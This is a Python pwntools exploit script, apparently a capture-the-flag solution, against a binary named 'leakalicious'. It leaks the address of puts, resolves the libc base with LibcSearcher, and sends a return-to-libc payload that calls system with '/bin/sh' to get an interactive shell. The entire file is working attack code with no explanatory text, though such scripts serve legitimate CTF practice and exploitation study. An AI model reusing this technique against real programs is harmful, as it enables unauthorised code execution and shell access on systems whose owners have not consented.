#!/usr/bin/env python
# -*- coding: utf-8 -*-
from LibcSearcher import *
from pwn import *

debug = 1
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./leakalicious')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('', )
elf = ELF('./leakalicious', checksec=False)

p.sendafter('What... is your handle?\n> ', 'a' * 0x20)
p.recvuntil('hmmm... aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
addr_puts = u32(p.recv(4))
libc = LibcSearcher('puts', addr_puts)
libcbase = addr_puts - libc.dump('puts')
addr_system = libcbase + libc.dump('system')
addr_bin_sh = libcbase + libc.dump('str_bin_sh')
pd = 'a' * 0x2c
pd += p32(addr_system)
pd += p32(0)
pd += p32(addr_bin_sh)
p.sendafter('What... is your exploit?\n> ', pd)
p.sendafter('What... version of libc am I using?\n> ', '')
p.interactive()
